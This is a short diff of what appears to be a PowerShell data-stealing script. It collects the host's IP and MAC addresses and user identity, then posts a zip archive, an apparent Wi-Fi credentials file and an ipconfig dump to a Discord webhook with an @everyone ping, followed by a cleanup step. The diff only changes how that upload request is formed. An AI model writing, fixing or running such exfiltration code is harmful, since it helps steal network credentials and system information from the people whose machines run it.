@@ -35,11 +35,11 @@ $info    = "IPS: $($ipv4 -join ', ') | MACS: $($mac -join ', ') | IPv6: $($ipv6 
 $content = "$($whoami_content) | $info | @everyone"
 
 Write-Output about to send to discord, file exists! $zip, $wifiFile, $e\ipcfg.txt
-Invoke-WebRequest -Uri $wh -Method POST -Form @{
+Invoke-WebRequest -Uri $wh -Method POST -Body @{
     content = $content
-    file1 = Get-Item $zip
-    file2 = Get-Item $wifiFile
-    file3 = Get-Item "$e\ipcfg.txt"
+    file1   = Get-Item $zip
+    file2   = Get-Item $wifiFile
+    file3   = Get-Item "$e\ipcfg.txt"
 }
 Write-Output sent to discord
 # cleanup
